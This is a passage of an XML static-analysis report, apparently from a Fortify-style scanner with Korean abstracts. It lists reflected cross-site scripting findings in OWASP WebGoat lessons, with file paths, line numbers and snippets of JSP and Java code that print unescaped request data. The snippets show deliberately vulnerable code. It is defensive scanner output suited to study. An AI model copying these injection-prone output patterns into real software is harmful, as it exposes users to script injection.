                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="010DCE834C1455F51DC4122EB9C7FC39" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="762CD42A531DB9C63409543D3F6FCB09" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 handleRequest() 메서드가 1086 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1086</LineStart>
<Snippet>		.setEncType("");

	form.addElement(createContent(s));

	setContent(form);</Snippet>
<TargetFunction>org.apache.ecs.html.Form.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4E43726896042D3BB22C91788F7AB9B4" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=SQLInjection.DISCIPLINARY_NOTES%&gt;"  cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F42DEED1CBE2D594CCC8BF02CC460E3E" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSqlInjection.java의 makeAccountLine() 메서드가 152 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>152</LineStart>
<Snippet>
	accountNumber = s.getParser().getRawParameter(ACCT_NUM, "101");
	Input input = new Input(Input.TEXT, ACCT_NUM, accountNumber.toString());
	ec.addElement(input);
</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E5979B2DC7FB8123D82D41315DCF60F6" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="292AFC9AD4D94ACF2F03FBC94374D29F" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReportCardScreen.java의 makeFeedback() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ReportCardScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ReportCardScreen.java</FilePath>
<LineStart>105</LineStart>
<Snippet>    {
	ElementContainer ec = new ElementContainer();
	ec.addElement(new Center(new StringElement(
		"Comments and suggestions are welcome. "
			+ s.getFeedbackAddress())));</Snippet>
<TargetFunction>org.apache.ecs.html.Center.Center()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6D839FD4FF3C7C9D318E33593549D73A" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 메서드가 166 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>166</LineStart>
<Snippet>	    tr.addElement(new TD().addElement(
		    new Input(Input.TEXT, "QTY4", s.getParser()
			    .getStringParameter("QTY4", "1")))
		    .setAlign("right"));
	    quantity = s.getParser().getFloatParameter("QTY4", 1.0f);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9249B373FEF98FEE9162C43CD9796528" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7254A7590AFC4358ECE78B61DC667AC7" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>JavaScriptValidation.java의 createContent() 메서드가 151 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>151</LineStart>
<Snippet>		    "301-604-4882");
	    ec.addElement(new StringElement(script));
	    TextArea input1 = new TextArea("field1", 1, 25).addElement(param1);
	    TextArea input2 = new TextArea("field2", 1, 25).addElement(param2);
	    TextArea input3 = new TextArea("field3", 1, 25).addElement(param3);</Snippet>
<TargetFunction>org.apache.ecs.html.TextArea.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C75571377C69454C7FF42151537948BE" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ECCDC093B44A753B2043DDE5391DD4EC" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSqlInjection.java의 createContent() 메서드가 175 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>175</LineStart>
<Snippet>	    String query = "SELECT * FROM user_data WHERE userid = "
		    + accountNumber;
	    ec.addElement(new PRE(query));
	    for (int i = 0; i &lt; accountNumber.length(); i++)
	    {</Snippet>
<TargetFunction>org.apache.ecs.html.PRE.PRE()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="967DE07ECC5BAA272793C7A24AD668BD" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=CrossSiteScripting.DISCIPLINARY_NOTES%&gt;" cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BAFE262E9791F5E977F788F61E9513CA" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A0C1F8A73A297AB13A14B0C10AE9C6F4" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="26B886A47E23E13491A24A041F7720CA" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9E4A504F8452EED9D162C824086ADFE7" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress1()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E96333566B65546D4E526B706A28DF9E" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="524E1BAA972B99B3A02D4B9AEF4BF6D3" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AD369356003E8FDF1BE045DC0DBD47C6" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HttpBasics.java의 createContent() 메서드가 69 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>HttpBasics.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpBasics.java</FilePath>
<LineStart>69</LineStart>
<Snippet>	    person.reverse();

	    Input input = new Input(Input.TEXT, PERSON, person.toString());
	    ec.addElement(input);
</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E241D7FF2D6AE2F879908F6E127B886E" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 38 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>38</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BA96AD33533F964D0DB484A2048D577F" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 53 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
